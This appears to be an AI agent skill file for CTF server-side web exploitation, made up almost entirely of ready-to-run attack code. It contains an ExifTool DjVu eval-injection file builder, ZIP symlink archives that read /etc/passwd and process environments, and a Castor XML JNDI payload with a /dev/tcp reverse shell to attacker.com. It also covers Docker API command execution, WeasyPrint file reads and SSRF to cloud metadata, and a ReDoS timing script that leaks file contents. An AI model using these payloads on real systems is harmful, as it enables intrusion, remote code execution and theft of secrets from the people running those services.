---
name: web-server-side-advanced
description: "CTF advanced server-side web exploitation. ExifTool DjVu ANTa eval injection, Go rune/byte mismatch UTF-8 length bypass, ZIP symlink traversal for file read, React Server Components Flight protocol RCE via constructor chain, Castor XML xsi:type polymorphism to JNDI/RMI, Nginx URL-encoded slash path traversal bypass, non-breaking space SQL subquery injection, Docker API unauthenticated daemon exploitation via port 2375, WeasyPrint SSRF file read via attachment processing, ReDoS timing oracle for file content extraction. Triggers: 'exiftool injection', 'go rune byte mismatch', 'zip symlink traversal', 'react server components rce', 'castor xml deserialization', 'nginx path traversal bypass', 'docker api unauthenticated', 'weasyprint ssrf', 'redos oracle', 'server side advanced ctf'."
---

# CTF Web: Advanced Server-Side Techniques

ExifTool DjVu, Go rune bypass, RSC Flight RCE, Docker API, ReDoS oracle.

---

## Phase 1: ExifTool DjVu ANTa Eval Injection

```bash
# CVE-2021-22204 style: DjVu annotation chunk with Perl eval
# ExifTool processes DjVu, ANTa chunk content passed to Perl eval

python3 << 'EOF'
# Craft malicious DjVu file:
import subprocess, struct

CHUNK_MAGIC = b'AT&TFORM'
DJVM_ID = b'DJVM'
DJVU_ID = b'DJVU'
ANTA_ID = b'ANTa'

# ANTa payload: executes in Perl eval:
payload = b'(metadata (Copyright "\\n" . `id > /tmp/pwned` . "\\n"))'

def djvu_file(anta_content):
    anta = ANTA_ID + struct.pack('>I', len(anta_content)) + anta_content
    # Pad to even length:
    if len(anta) % 2: anta += b'\x00'
    djvu_inner = DJVU_ID + anta
    # Fake INFO chunk (required):
    info = b'INFO' + struct.pack('>I', 10) + b'\x00' * 10
    djvu_body = info + djvu_inner
    form = CHUNK_MAGIC + struct.pack('>I', len(djvu_body)) + djvu_body
    return form

with open('exploit.djvu', 'wb') as f:
    f.write(djvu_file(payload))

print("Upload exploit.djvu to ExifTool image processor")
print("Result should appear in /tmp/pwned")
EOF

# Upload and trigger:
curl -sk -F "file=@exploit.djvu" "https://TARGET/upload" \
    -H "Authorization: Bearer $TOKEN"
# Then read result if LFI available, or use OOB
```

---

## Phase 2: Go Rune/Byte Mismatch

```go
// Pattern: len(s) counts bytes, but validation uses rune count
// Multi-byte UTF-8 char: 1 rune = 4 bytes (emoji)
// Bypass length limits: 10 runes but 40 bytes

// Vulnerable Go code:
if utf8.RuneCountInString(username) > 10 {
    return ErrTooLong
}
// But then: copy into 10-byte buffer → overflow

// Exploit payloads:
// 1 rune that is 4 bytes:
payload = "🔥" * 10  # 10 runes = 40 bytes

// Bypass email validation:
// @ is 1 byte, emoji before @ passes rune-count check
python3 -c "
s = '🔥' * 5 + '@example.com'
print(f'Runes: {len(s)}, Bytes: {len(s.encode())}')
print(s)
"

// SSRF via URL length bypass:
// Server checks len(url) <= 50 bytes as runes
// Pad with 4-byte chars: http://internal/ + 🔥*N → still short in runes
```

---

## Phase 3: ZIP Symlink Traversal

```bash
# Create zip with symlink pointing to sensitive file:
ln -s /etc/passwd passwd_link
zip --symlinks exploit.zip passwd_link

# For deeper traversal:
ln -s /proc/1/environ environ_link
zip --symlinks exploit.zip environ_link

# Upload and fetch via the link:
curl -sk -F "file=@exploit.zip" "https://TARGET/upload"
# Then: GET /uploads/passwd_link (if server extracts and serves)

# Python version:
python3 << 'EOF'
import zipfile, os
zf = zipfile.ZipFile('exploit.zip', 'w')
info = zipfile.ZipInfo('symlink_to_flag')
info.create_system = 3  # Unix
info.external_attr = 0xA1ED0000  # symlink attr
zf.writestr(info, '/etc/passwd')
zf.close()
print("Upload exploit.zip")
EOF

# Test if -y flag is set on server-side zip extraction:
# (zip -y preserves symlinks)
```

---

## Phase 4: React Server Components Flight Protocol RCE

```javascript
// React Server Components deserialization via Flight protocol
// Constructor chain bypasses class checks

// WAF bypass: string concatenation:
const payload_clean = 'Function("return this")()';
// If WAF blocks "Function": use hex/concat:
const payload_waf = '\\x46unction("return \\x74his")()';
// Or:
const fn_name = 'con' + 'structor';
const payload_chain = `({}).${fn_name}.${fn_name}("return process.env")()`;

// Full RCE via constructor chain (no WAF):
// POST to RSC endpoint with Flight protocol body:
// data: 1:{"$$typeof":"$L1","type":{"$$typeof":"$L2"},...}
// Where L2 references constructor.constructor chain

// Server-side eval via flight body:
fetch('/api/rsc', {
    method: 'POST',
    headers: { 'Content-Type': 'text/x-component' },
    body: JSON.stringify({
        // Craft based on specific RSC implementation
        // Look for: deserializeElement, parseRow, eval-like constructs
    })
});
```

---

## Phase 5: Castor XML Polymorphism JNDI/RMI

```xml
<!-- Castor XML xsi:type allows arbitrary class instantiation -->
<!-- Upload or POST this XML to marshalling endpoint -->

<?xml version="1.0" encoding="UTF-8"?>
<request xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xmlns:java="http://java.sun.com">
  <data xsi:type="java:com.sun.jndi.rmi.registry.RegistryContext">
    <url>rmi://attacker.com:1099/exploit</url>
  </data>
</request>
```

```bash
# Step 1: Start JNDI exploit server:
java -jar JNDI-Exploit-Kit.jar -C "bash -i >& /dev/tcp/attacker.com/4444 0>&1" -A "attacker.com"

# Step 2: Start RMI registry:
python3 -m http.server 8888 &  # serve malicious class

# Step 3: Send payload:
curl -sk -X POST "https://TARGET/api/unmarshal" \
    -H "Content-Type: application/xml" \
    -d @castor_payload.xml

# Detection: look for castor-xml in pom.xml or build.gradle
# + commons-beanutils in classpath = classic POP chain available
```

---

## Phase 6: Docker API Unauthenticated (Port 2375)

```bash
DOCKER_HOST="http://INTERNAL_IP:2375"

# If SSRF exists to internal network:
# Use SSRF to proxy requests to Docker daemon

# List containers:
curl -sk "$DOCKER_HOST/containers/json" | python3 -m json.tool

# Read files from running container:
CONTAINER_ID="XXXX"
curl -sk "$DOCKER_HOST/containers/$CONTAINER_ID/archive?path=/etc/passwd" \
    | tar xz -O

# Execute command in container:
# Step 1: Create exec:
EXEC_ID=$(curl -sk -X POST "$DOCKER_HOST/containers/$CONTAINER_ID/exec" \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/flag.txt"]}' \
    | python3 -c "import json,sys; print(json.load(sys.stdin)['Id'])")

# Step 2: Start exec:
curl -sk -X POST "$DOCKER_HOST/exec/$EXEC_ID/start" \
    -H "Content-Type: application/json" \
    -d '{"Detach":false}' --output -

# Via SSRF relay endpoint:
curl -sk "https://TARGET/api/fetch" \
    -d '{"url":"http://172.17.0.1:2375/containers/json"}'
```

---

## Phase 7: WeasyPrint SSRF / File Read

```python
# WeasyPrint processes HTML → PDF
# Exploit: embed file:// or http:// in img src or stylesheet

# File read via HTML attachment:
html_payload = """
<html>
<head>
<link rel="stylesheet" href="file:///etc/passwd">
</head>
<body>

</body>
</html>
"""

# Or via CSS @import:
css_payload = """
@import url("file:///etc/passwd");
"""

# Request:
import requests
resp = requests.post('https://TARGET/api/generate-pdf',
    json={'html': html_payload},
    headers={'Authorization': f'Bearer {TOKEN}'},
    verify=False)

# Blind SSRF to detect internal services:
html_ssrf = '<img src="http://169.254.169.254/latest/meta-data/">'
resp = requests.post('https://TARGET/api/generate-pdf',
    json={'html': html_ssrf}, verify=False)
# Content visible in generated PDF
```

---

## Phase 8: ReDoS as Timing Oracle

```python
import requests, time, string

TARGET = "https://TARGET"
TOKEN = "..."
TARGET_FILE = "/proc/1/environ"  # or /flag.txt

def read_char(prefix, pos, timeout_threshold=3.0):
    """Use ReDoS to leak one character via timing."""
    for c in string.printable:
        # Pattern causes exponential backtracking only when prefix+c matches:
        pattern = f"^{re.escape(prefix + c)}(a+)+$"

        start = time.time()
        try:
            resp = requests.post(f"{TARGET}/api/search",
                json={"pattern": pattern, "file": TARGET_FILE},
                headers={'Authorization': f'Bearer {TOKEN}'},
                timeout=timeout_threshold + 1,
                verify=False)
        except requests.Timeout:
            return c
        elapsed = time.time() - start
        if elapsed > timeout_threshold:
            return c

    return None  # position exhausted

import re
leaked = ""
for i in range(100):
    c = read_char(leaked, i)
    if c is None: break
    leaked += c
    print(f"\rLeaked: {leaked}", end='', flush=True)
print(f"\nResult: {leaked}")
```

---

## Output

Save to `.omop/engagement/ctf/web/`:
- `exploit.zip` / `exploit.djvu`: crafted payloads
- `flag.txt`: captured flag

## Next Phase

→ `ctf-web-server-exec` for RCE-focused techniques
→ `ctf-web-auth-infra` for auth exploitation
